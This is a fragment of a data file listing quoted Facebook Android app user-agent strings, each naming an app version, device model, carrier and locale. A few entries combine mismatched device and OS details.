"[FBAN/FB4A;FBAV/322.0.0.35.121;FBBV/297186872;FBDM/{density=2.75,width=1080,height=2110};FBLC/cs_CZ;FBRV/298581620;FBCR/T-Mobile CZ;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2003J15SC;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/322.0.0.35.121;FBBV/297186794;FBDM/{density=2.0,width=720,height=1184};FBLC/cs_CZ;FBRV/298653666;FBCR/O2.CZ;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/G3112;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/322.0.0.35.121;FBBV/297186872;FBDM/{density=2.75,width=1080,height=2131};FBLC/cs_CZ;FBRV/298964384;FBCR/Vodafone CZ;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 7;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/322.0.0.35.121;FBBV/297186872;FBDM/{density=2.625,width=1080,height=2034};FBLC/cs_CZ;FBRV/298830944;FBCR/Vodafone CZ;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LM-G810;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/323.0.0.46.119;FBBV/298672900;FBDM/{density=3.0,width=1080,height=2040};FBLC/cs_CZ;FBRV/299651382;FBCR/O2.CZ;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/RNE-L21;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/316.0.0.54.116;FBBV/287518977;FBDM/{density=1.5,width=480,height=800};FBLC/en_US;FBRV/289140577;FBCR/JIO 4G;FBMF/Micromax;FBBD/Micromax;FBPN/com.facebook.katana;FBDV/Micromax Q402+;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/318.0.0.39.154;FBBV/290428684;FBDM/{density=2.25,width=720,height=1172};FBLC/pt_BR;FBRV/292674890;FBCR/TIM;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/Moto E (4) Plus;FBSV/7.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]",
"[FBAN/FB4A;FBAV/323.0.0.46.119;FBBV/298672941;FBDM/{density=2.625,width=1080,height=2186};FBLC/cs_CZ;FBRV/300485215;FBCR/VODAFONE CZ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A515F;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/323.0.0.46.119;FBBV/298672941;FBDM/{density=2.75,width=1080,height=2131};FBLC/cs_CZ;FBRV/300368916;FBCR/Oskarta;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 7;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/322.0.0.35.121;FBBV/297186794;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBRV/0;FBCR/airtel;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 5A;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z016D;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]",
"Dalvik/1.6.0 (Linux; U; Android 6.0; Build/MXB48T) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z016D;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]",
"Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J320F Build/LMY47V) [FBAN/FB4A;FBAV/43.0.0.29.147;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/14274161;FBCR/Tele2 LT;FBMF/samsung;FBBD/samsung;FBDV/SM-J320F;FBSV/5.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]",
"[FBAN/FB4A;FBAV/303.0.0.27.12227;FBBV/261476344;FBDM/{density=2.625,width=1080,height=1920};FBLC/ru_RU;FBRV/0;FBCR/MegaFon;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A720F;FBSV/8.0.0;FBBK/0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/324.0.0.48.120;FBBV/300480919;FBDM/{density=3.0,width=1080,height=2110};FBLC/cs_CZ;FBRV/301251000;FBCR/T-Mobile CZ;FBMF/HUAWEI;FBBD/HONOR;FBPN/com.facebook.katana;FBDV/YAL-L21;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/319.0.0.39.120;FBBV/292233352;FBDM/{density=2.0,width=720,height=1344};FBLC/en_US;FBRV/296244047;FBCR/airtel;FBMF/GIONEE;FBBD/GIONEE;FBPN/com.facebook.katana;FBDV/GIONEE F205;FBSV/7.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/300.2.0.58.129;FBBV/265245014;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBRV/268119191;FBCR/Jio 4G;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Y1 Lite;FBSV/7.1.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/320.0.0.34.118;FBBV/293906272;FBDM/{density=3.0,width=1080,height=2107};FBLC/cs_CZ;FBRV/296240860;FBCR/T-Mobile CZ;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/MAR-LX1A;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/323.0.0.46.119;FBBV/298672941;FBDM/{density=3.0,width=1080,height=2107};FBLC/cs_CZ;FBRV/300746539;FBCR/O2-CZ;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/MAR-LX1A;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/324.0.0.48.120;FBBV/300480919;FBDM/{density=2.625,width=1080,height=2186};FBLC/cs_CZ;FBRV/301471997;FBCR/O2 Family;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A515F;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/324.0.0.48.120;FBBV/300480893;FBDM/{density=2.75,width=1080,height=2131};FBLC/cs_CZ;FBRV/301285723;FBCR/T-Mobile CZ;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 7;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/324.0.0.48.120;FBBV/300480914;FBDM/{density=2.0,width=720,height=1448};FBLC/cs_CZ;FBRV/301461075;FBCR/O2.CZ;FBMF/realme;FBBD/realme;FBPN/com.facebook.katana;FBDV/RMX2193;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/324.0.0.48.120;FBBV/300480895;FBDM/{density=4.0,width=1440,height=2672};FBLC/cs_CZ;FBRV/0;FBCR/O2.CZ;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LG-H870;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/324.0.0.48.120;FBBV/300480885;FBDM/{density=2.0,width=720,height=1280};FBLC/cs_CZ;FBRV/0;FBCR/O2 Family;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G930F;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/324.0.0.48.120;FBBV/300480919;FBDM/{density=2.75,width=1080,height=2138};FBLC/cs_CZ;FBRV/301471997;FBCR/;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Mi Note 10;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/324.0.0.48.120;FBBV/300480893;FBDM/{density=3.0,width=1080,height=2130};FBLC/cs_CZ;FBRV/301065825;FBCR/T-Mobile CZ;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/PAR-LX1;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/324.0.0.48.120;FBBV/300480881;FBDM/{density=1.3312501,width=1280,height=752};FBLC/cs_CZ;FBRV/0;FBCR/;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/AGS-W09;FBSV/7.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/324.0.0.48.120;FBBV/300480919;FBDM/{density=3.0,width=1080,height=2107};FBLC/cs_CZ;FBRV/301461075;FBCR/T-Mobile CZ;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/MAR-LX1A;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/323.0.0.46.119;FBBV/298672941;FBDM/{density=3.0,width=1080,height=2107};FBLC/cs_CZ;FBRV/300670669;FBCR/T-Mobile CZ;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/MAR-LX1A;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/324.0.0.48.120;FBBV/300480914;FBDM/{density=2.0,width=720,height=1369};FBLC/cs_CZ;FBRV/301461075;FBCR/O2.CZ;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 7;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/324.0.0.48.120;FBBV/300480919;FBDM/{density=2.75,width=1080,height=2179};FBLC/cs_CZ;FBRV/301594538;FBCR/O2.CZ;FBMF/Xiaomi;FBBD/POCO;FBPN/com.facebook.katana;FBDV/M2007J20CG;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/324.0.0.48.120;FBBV/300480919;FBDM/{density=3.0,width=1080,height=2178};FBLC/cs_CZ;FBRV/301461075;FBCR/O2.CZ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G980F;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/324.0.0.48.120;FBBV/300480919;FBDM/{density=2.75,width=1080,height=2131};FBLC/cs_CZ;FBRV/301594538;FBCR/Vodafone CZ;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 7;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/324.0.0.48.120;FBBV/300480919;FBDM/{density=2.75,width=1080,height=2131};FBLC/cs_CZ;FBRV/301749461;FBCR/Oskarta;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 7;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/323.0.0.46.119;FBBV/298672914;FBDM/{density=3.0,width=1080,height=2208};FBLC/cs_CZ;FBRV/300746539;FBCR/Vodafone CZ;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/JNY-LX1;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/324.0.0.48.120;FBBV/300480919;FBDM/{density=3.0,width=1080,height=2107};FBLC/cs_CZ;FBRV/301251000;FBCR/T-Mobile CZ;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/MAR-LX1A;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/324.0.0.48.120;FBBV/300480919;FBDM/{density=2.625,width=1080,height=2094};FBLC/cs_CZ;FBRV/301461075;FBCR/T-Mobile CZ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A750FN;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/324.0.0.48.120;FBBV/300480919;FBDM/{density=2.75,width=1080,height=2135};FBLC/cs_CZ;FBRV/301724568;FBCR/Vodafone CZ;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/MI 9;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/305.1.0.40.120;FBBV/272401182;FBDM/{density=2.0,width=720,height=1412};FBLC/en_GB;FBRV/274073372;FBCR/Vi India;FBMF/Realme;FBBD/Realme;FBPN/com.facebook.katana;FBDV/RMX1945;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/310.0.0.50.118;FBBV/278533659;FBDM/{density=2.0,width=720,height=1280};FBLC/en_GB;FBRV/0;FBCR/Jio 4G;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 4;FBSV/7.1.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/324.0.0.48.120;FBBV/300480919;FBDM/{density=3.0,width=1080,height=2265};FBLC/cs_CZ;FBRV/301829631;FBCR/T-Mobile CZ;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/VOG-L29;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/324.0.0.48.120;FBBV/300480919;FBDM/{density=2.625,width=1080,height=2186};FBLC/cs_CZ;FBRV/301848364;FBCR/O2.CZ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A515F;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/323.0.0.46.119;FBBV/298672941;FBDM/{density=3.0,width=1080,height=2043};FBLC/cs_CZ;FBRV/300746539;FBCR/Vodafone CZ;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Mi A2 Lite;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/324.0.0.48.120;FBBV/300480893;FBDM/{density=3.0,width=1080,height=2060};FBLC/cs_CZ;FBRV/301848364;FBCR/O2.CZ;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/ANE-LX1;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/324.0.0.48.120;FBBV/300480919;FBDM/{density=3.0,width=2129,height=1080};FBLC/cs_CZ;FBRV/302048709;FBCR/T-Mobile CZ;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Mi 9 SE;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/324.0.0.48.120;FBBV/300480893;FBDM/{density=2.75,width=1080,height=2131};FBLC/cs_CZ;FBRV/302003390;FBCR/T-Mobile CZ;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 7;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/324.0.0.48.120;FBBV/300480919;FBDM/{density=3.0,width=1080,height=2107};FBLC/cs_CZ;FBRV/302048709;FBCR/Vodafone CZ;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/MAR-LX1A;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/324.0.0.48.120;FBBV/300480634;FBDM/{density=3.0,width=1080,height=2107};FBLC/cs_CZ;FBRV/301461075;FBCR/TUNISIANA;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/MAR-LX1A;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/324.0.0.48.120;FBBV/300480893;FBDM/{density=3.0,width=1080,height=2130};FBLC/cs_CZ;FBRV/302048709;FBCR/T-Mobile CZ;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/PAR-LX1;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/324.0.0.48.120;FBBV/300480885;FBDM/{density=3.0,width=1080,height=2102};FBLC/cs_CZ;FBRV/302003390;FBCR/T-Mobile CZ;FBMF/Lenovo;FBBD/Lenovo;FBPN/com.facebook.katana;FBDV/Lenovo L58041;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/324.0.0.48.120;FBBV/300480885;FBDM/{density=3.0,width=1080,height=2016};FBLC/cs_CZ;FBRV/302048709;FBCR/Vodafone CZ;FBMF/CUBOT;FBBD/CUBOT;FBPN/com.facebook.katana;FBDV/CUBOT_X18_Plus;FBSV/8.0.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/324.0.0.48.120;FBBV/300480919;FBDM/{density=2.75,width=1080,height=2134};FBLC/cs_CZ;FBRV/302048709;FBCR/O2.CZ;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 8 Pro;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/324.0.0.48.120;FBBV/300480919;FBDM/{density=2.625,width=1080,height=2274};FBLC/cs_CZ;FBRV/301461075;FBCR/vodafone IT;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_I002D;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/325.0.0.36.170;FBBV/301621682;FBDM/{density=2.75,width=1080,height=2130};FBLC/cs_CZ;FBRV/302401544;FBCR/Vodafone CZ;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 8T;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/324.0.0.48.120;FBBV/300480919;FBDM/{density=2.625,width=1080,height=2186};FBLC/cs_CZ;FBRV/0;FBCR/T-Mobile CZ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A515F;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/325.0.0.36.170;FBBV/301621682;FBDM/{density=2.625,width=1080,height=2094};FBLC/cs_CZ;FBRV/302569938;FBCR/Vodafone CZ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A750FN;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/222.0.0.48.113;FBBV/155323366;FBDM/{density=2.0,width=720,height=1360};FBLC/sr_RS;FBRV/156625696;FBCR/mt:s;FBMF/Redmi Note 3;FBBD/Redmi Note 3;FBPN/com.facebook.katana;FBDV/LDN-L21;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/67.0.3396.87 Mobile Safari/537.36 [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]",
"Mozilla/5.0 (Linux; Android 9.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/67.0.3396.87 Mobile Safari/537.36 [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]",
"[FBAN/FB4A;FBAV/325.0.0.36.170;FBBV/301621682;FBDM/{density=2.75,width=1080,height=2130};FBLC/cs_CZ;FBRV/302782848;FBCR/Vodafone CZ;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 8T;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/325.0.0.36.170;FBBV/301621682;FBDM/{density=2.75,width=1080,height=2179};FBLC/cs_CZ;FBRV/302869401;FBCR/O2.CZ;FBMF/Xiaomi;FBBD/POCO;FBPN/com.facebook.katana;FBDV/M2102J20SG;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/325.0.0.36.170;FBBV/301621626;FBDM/{density=3.0,width=1080,height=2076};FBLC/cs_CZ;FBRV/302782848;FBCR/T-Mobile CZ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G950F;FBSV/9;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/325.0.0.36.170;FBBV/301621626;FBDM/{density=2.625,width=1080,height=2137};FBLC/cs_CZ;FBRV/0;FBCR/T-Mobile CZ;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/motorola one zoom;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/320.0.0.34.118;FBBV/293905889;FBDM/{density=3.0,width=1080,height=2107};FBLC/fr_FR;FBRV/295842623;FBCR/Ooredoo TN;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/MAR-LX1M;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"Dalvik/1.6.0 (Linux; U; Android 4.4.2; SM-G3518 Build/JLS36C) [FBAN/FB4A;FBAV/251.0.0.31.111;FBPN/com.facebook.katana;FBLC/en_US;FBBV/188827991;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBDV/SM-G3518;FBSV/4.4.2;FBCA/x86:armeabi-v7a;FBDM/{density=1.5,width=720,height=1244};FB_FW/1;FBRV/190301973;]",
"Dalvik/1.6.0 (Linux; U; Android 5; SM-G3518 Build/JLS36C) [FBAN/FB4A;FBAV/251.0.0.31.111;FBPN/com.facebook.katana;FBLC/en_US;FBBV/188827991;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBDV/SM-G3518;FBSV/4.4.2;FBCA/x86:armeabi-v7a;FBDM/{density=1.5,width=720,height=1244};FB_FW/1;FBRV/190301973;]",
"[FBAN/FB4A;FBAV/325.0.0.36.170;FBBV/301621682;FBDM/{density=2.75,width=1080,height=2110};FBLC/cs_CZ;FBRV/303010809;FBCR/T-Mobile CZ;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2003J15SC;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/325.0.0.36.170;FBBV/301621682;FBDM/{density=3.0,width=1080,height=2060};FBLC/cs_CZ;FBRV/302944588;FBCR/Vodafone CZ;FBMF/HUAWEI;FBBD/HONOR;FBPN/com.facebook.katana;FBDV/COL-L29;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/325.0.0.36.170;FBBV/301621644;FBDM/{density=2.0,width=720,height=1344};FBLC/cs_CZ;FBRV/303150654;FBCR/Vodafone CZ;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 7A;FBSV/10;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/325.0.0.36.170;FBBV/301621682;FBDM/{density=3.0,width=1080,height=2224};FBLC/cs_CZ;FBRV/0;FBCR/T-Mobile CZ;FBMF/HUAWEI;FBBD/HONOR;FBPN/com.facebook.katana;FBDV/STK-LX1;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/325.0.0.36.170;FBBV/301621682;FBDM/{density=2.75,width=1080,height=2130};FBLC/cs_CZ;FBRV/303357940;FBCR/Vodafone CZ;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 8;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/317.0.0.51.119;FBBV/288708225;FBDM/{density=2.0,width=720,height=1344};FBLC/ru_RU;FBRV/290947837;FBCR/Beeline;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 5;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/325.0.0.36.170;FBBV/301621682;FBDM/{density=2.625,width=1080,height=2132};FBLC/cs_CZ;FBRV/303418653;FBCR/Vodafone CZ;FBMF/HMD Global;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/Nokia 7.2;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/325.0.0.36.170;FBBV/301621600;FBDM/{density=1.5,width=480,height=800};FBLC/en_US;FBRV/0;FBCR/JIO 4G;FBMF/Micromax;FBBD/Micromax;FBPN/com.facebook.katana;FBDV/Micromax Q402+;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/325.0.0.36.170;FBBV/301621604;FBDM/{density=2.0,width=720,height=1184};FBLC/cs_CZ;FBRV/303418653;FBCR/O2.CZ;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/G3112;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/325.0.0.36.170;FBBV/301621604;FBDM/{density=2.0,width=720,height=1344};FBLC/cs_CZ;FBRV/303418653;FBCR/T-Mobile CZ;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 5;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"Mozilla/5.0 (Linux; Android 10.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/67.0.3396.87 Mobile Safari/537.36 [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]",
"[FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]",
"Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4A Build/N2G47H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]",
"Mozilla/5.0 (Linux; Android 10; SM-N976V Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/255.0.0.33.121;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]",
"Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Mobile Safari/537.36 [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]",
